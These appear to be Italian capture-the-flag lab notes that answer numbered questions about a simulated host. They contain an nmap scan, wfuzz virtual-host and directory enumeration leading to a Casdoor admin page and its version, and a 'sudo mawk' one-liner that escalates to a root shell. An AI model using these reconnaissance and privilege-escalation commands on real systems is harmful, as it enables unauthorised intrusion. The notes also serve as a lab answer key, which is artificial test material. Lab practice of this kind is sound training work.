## SIM2_B2R01
con `nmap -sS -sC -sV 192.168.14.13` si ottengono due porte aperte.
![[Pasted image 20260612143400.png]]
* `ssh`
* `http` su 80


## SIM2_B2R02
sulla sezione info trovo `orbetellobiblio.vdsi`
## SIM2_B2R03
Usando fuzz, cerco il virtual host:
```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://orbetellobiblio.vdsi/" -H "Host: FUZZ.orbetellobiblio.vdsi" --hh 2100,157,153,702
```

Trovo il `vhost: management.orbetellobiblio.vdsi`, la flag e' `http://management.orbetellobiblio.vdsi`.

Inoltre con:
```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://management.orbetellobiblio.vdsi/FUZZ"--hh 2100,157,153,702
```

> [!note] `/etc/host`
> devo inserire in `/etc/host` le associazionin per `management.orbetellobiblio.vdsi` ed `orbetellobiblio.vdsi`

trovo che esiste `/identity` che mi reindirizza a `http://casdoor.admin.orbetellobiblio.vdsi/`, questa e' la flag

## SIM2_B2R04
`http://casdoor.admin.orbetellobiblio.vdsi`
## SIM2_B2R05
`Csadoor`
## SIM2_B2R06
In `http://management.orbetellobiblio.vdsi/notes.html` trovo che la versione e' `3.54.0`.

## SIM2_B2R07
`sudo mawk 'BEGIN {system("/bin/bash")}'`